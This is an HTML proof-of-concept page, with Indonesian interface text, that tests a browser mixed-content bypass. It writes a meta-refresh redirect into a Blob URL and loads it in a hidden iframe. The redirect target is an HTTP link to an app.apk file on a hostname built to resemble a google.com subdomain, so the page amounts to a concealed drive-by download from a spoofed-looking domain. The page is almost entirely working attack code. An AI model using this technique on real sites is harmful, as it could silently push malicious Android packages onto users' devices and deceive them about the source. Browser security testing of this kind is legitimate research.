<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC - Blob URL Mixed Content Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f9;
        }
        .container {
            max-width: 600px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        button {
            padding: 10px 15px;
            font-size: 14px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #log {
            margin-top: 15px;
            padding: 10px;
            background: #e9ecef;
            border-radius: 4px;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>PoC: Mixed Content via Blob Iframe</h2>
    <p>Pengujian muatan file HTTP melalui instruksi Meta Refresh di dalam Blob URL.</p>
    
    <button onclick="runTest()">Jalankan Pengujian</button>

    <div id="log">Status: Menunggu eksekusi...</div>
</div>

<script>
    function logMessage(msg) {
        const logDiv = document.getElementById('log');
        logDiv.innerText += "\n" + msg;
    }

    function runTest() {
        logMessage("[+] Memulai pengujian...");

        // 1. Tentukan target URL HTTP
        // Ganti dengan URL file tes HTTP milikmu
        const httpTarget = "http://ا.google.com.ا.novianproject.my.id/app.apk"; 

        // 2. Buat konten HTML berisi meta refresh
        const htmlContent = `<meta http-equiv="refresh" content="0;url=${httpTarget}">`;
        logMessage("[+] Mengenerate HTML content...");

        // 3. Buat Blob dan Blob URL
        const blob = new Blob([htmlContent], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        logMessage(`[+] Blob URL dibuat: ${blobUrl}`);

        // 4. Buat elemen iframe dan masukkan ke DOM
        const iframe = document.createElement('iframe');
        iframe.style.display = "none"; // Disembunyikan agar berjalan di latar belakang
        iframe.src = blobUrl;
        
        document.body.appendChild(iframe);
        logMessage("[+] Iframe disuntikkan ke DOM. Memeriksa respon browser...");
        logMessage("[!] Buka Developer Tools (F12) -> Console / Network untuk melihat hasil blokir.");
    }
</script>

</body>
</html>
